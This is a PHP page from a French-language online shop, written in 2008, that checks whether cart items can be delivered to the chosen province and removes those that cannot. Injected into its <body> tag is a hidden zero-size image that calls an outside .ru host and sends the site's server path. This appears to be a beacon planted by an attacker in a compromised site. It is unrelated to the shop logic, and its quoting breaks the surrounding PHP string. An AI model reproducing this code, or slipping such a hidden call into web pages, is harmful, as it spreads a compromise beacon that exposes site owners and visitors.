<?php 
/* Programme : panier_valide.php
* Description : valide si le contenu du panier peut-être livré dans la province choisi
* Auteur : Denis Léveillé 	 		  Date : 2008-05-22
*/
include('lib/config.php');

if( !isset($_SESSION[$_SERVER['SERVER_NAME']]) ){
	unset( $_SESSION['redir'] );
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=connexion.php'>";
	exit();

}

if( !isset($_SESSION['Service']) ) {
	echo"<META HTTP-EQUIV=Refresh CONTENT='0; URL=accueil.php'>";
	exit();
}

$monPanier = panierInfos($_SESSION['panier'], get_Livreur_id( $_SESSION['province'] ) ); 
if( $monPanier == false ) 
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=chk_paiement.php'>";

$Province = get_Livreur($_SESSION['destinataire']['livraison_province']);
$ItemPasBon = panierValide( $_SESSION['panier'], $Province ); 

// Es-ce que je me rappel ou je rentre pour la premiere fois ou refreah
if( isset( $_GET['retour'] ) ||  ( $ItemPasBon == false ) ) {
//var_dump($ItemPasBon);
//echo "<br>";	
	if( $ItemPasBon != false ) {
//echo "Item pas bon<br>";	
		foreach( $ItemPasBon as $clé => $valeur ) {
//				echo "Cle : $clé Valeur : $valeur<br>";	
				panierSupprime( $_SESSION['panier'], $clé );
		}
	}
	//***********************************************
	//***** CALCUL DU TOTAL DU PANIER ***************
	//***********************************************
	include('panier_calcul.inc');
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=chk_paiement.php'>";
}
else {
	$UnPanier = array();
	foreach( $ItemPasBon as $clé => $valeur ) {
			panierAjout( $UnPanier, $clé );
	}
	$monPanier = panierInfos( $UnPanier );
//	$EN_PANIER = 1;
	$_AVECITEM = 1;
	$_Retour = 'panier_valide';
	switch( $_SESSION['devise'] ) {
		case 'CUC'	:	$image = 'images/cuba.gif';
							break;
		case 'USD'	:	$image = 'images/usa.gif';
							break;
		case 'EUR'	:	$image = 'images/europe.gif';
							break;
		default		:  $image = 'images/canada.gif';
							break;
	} // switch devise
	
	echo
	"<html>
		<head>
			<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
			<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
			<meta name='description' content='".$txt['MetaDescription']."'>
			<meta name='keywords' content='".$txt['MetaKeyword']."'>
			<link href='styles/style.css' rel='stylesheet' type='text/css'>
			<base target='MAIN'>
		</head>
	<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/> 
		<form name='monPanier' action='panier_valide.php?retour=0' method='post' >
		<table width='$Large' bgcolor='#dae5fb' cellpadding='0' cellspacing='0' border='0' align='$Enligne' valign='top' >
			<tr>
				<td> "; 
			
	echo "	<div style='text-align: center;margin:10px'>
					<font color='#D00E29' size='3' face='verdana'><b>".$txt['msg_ote_disponible']."</b></font>
				</div>
			</td>
		</tr>	
		<tr>
			<td>"
	?>
					<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='1'>
	<?php include('facture.inc'); ?>
					</table>
			</td>
		</tr>	
		<tr>
			<td>
				<div style='float:right;margin:10px'>
					<input type='submit' name='Caisse' value='<?=$txt['passez_a_letape_suivante']?>' class='boutrouge' >
				</div>
				<div style='float:right;margin:10px'>
					<input type='button' name='Caisse' value="<?=$txt['mon_panier_dachat']?>" 
						onClick='window.open("panier_list.php","MAIN"); return false;' class='boutrouge' >
				</div>
		   </td>
		</tr>
	<?		
//		echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=panier_list.php'>";
} // si article non livrable

?>
	</table>
	</form>
<script language='JavaScript1.2'>

	function Rafraichie(){
		 		window.location.reload();
	} // Rafraichie
	

</script>
</body>
</html>

